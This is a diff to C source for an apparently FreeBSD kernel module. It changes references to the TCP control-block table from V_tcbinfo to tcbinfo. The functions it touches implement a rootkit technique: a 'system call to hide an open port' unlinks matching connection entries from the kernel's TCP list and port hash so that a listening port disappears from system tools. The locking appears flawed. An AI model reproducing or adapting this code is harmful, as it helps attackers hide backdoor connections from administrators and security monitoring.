@@ -21,7 +21,7 @@
 //1
 static int iterate_ipi_listhead(u_int16_t lport) {
     struct inpcb *inpb;
-    CK_LIST_FOREACH(inpb, V_tcbinfo.ipi_listhead, inp_list) {
+    CK_LIST_FOREACH(inpb, tcbinfo.ipi_listhead, inp_list) {
     
         if (inpb->inp_vflag & INP_TIMEWAIT)
             continue;
@@ -29,7 +29,7 @@ static int iterate_ipi_listhead(u_int16_t lport) {
 /* Do we want to hide this local open port? */
         if (lport == ntohs(inpb->inp_inc.inc_ie.ie_lport)){
             CK_LIST_REMOVE(inpb, inp_list);
-            V_tcbinfo.ipi_count--; //reduce ipi_count  
+            tcbinfo.ipi_count--; //reduce ipi_count  
 	} 
 	INP_WUNLOCK(inpb);
     }
@@ -45,14 +45,14 @@ static int iterate_port_hash(u_int16_t lport) {
      //struct inpcb *inpb;
      struct inpcbport *inpb;
      //cur, head, list
-     CK_LIST_FOREACH(inpb, V_tcbinfo.ipi_porthashbase, phd_hash) {
+     CK_LIST_FOREACH(inpb, tcbinfo.ipi_porthashbase, phd_hash) {
     
-        INP_HASH_WLOCK(&V_tcbinfo);
+        INP_HASH_WLOCK(&tcbinfo);
 // Do we want to hide this local open port? 
         if (lport == ntohs(inpb->phd_port)){
             CK_LIST_REMOVE(inpb, phd_hash);   
 	}
-	INP_HASH_WUNLOCK(&V_tcbinfo);
+	INP_HASH_WUNLOCK(&tcbinfo);
      }	
       return 0;
 }
@@ -67,11 +67,11 @@ static int iterate_hash(u_int16_t lport){
 /* System call to hide an open port. */
 int port_hiding(u_int16_t lport) {
 
-    INP_INFO_WLOCK(&V_tcbinfo);
+    INP_INFO_WLOCK(&tcbinfo);
     /* Iterate through the TCP-based inpcb list. */
     iterate_ipi_listhead(lport); 
     iterate_port_hash(lport); 
-    INP_INFO_WUNLOCK(&V_tcbinfo);
+    INP_INFO_WUNLOCK(&tcbinfo);
     return(0);
 }
 
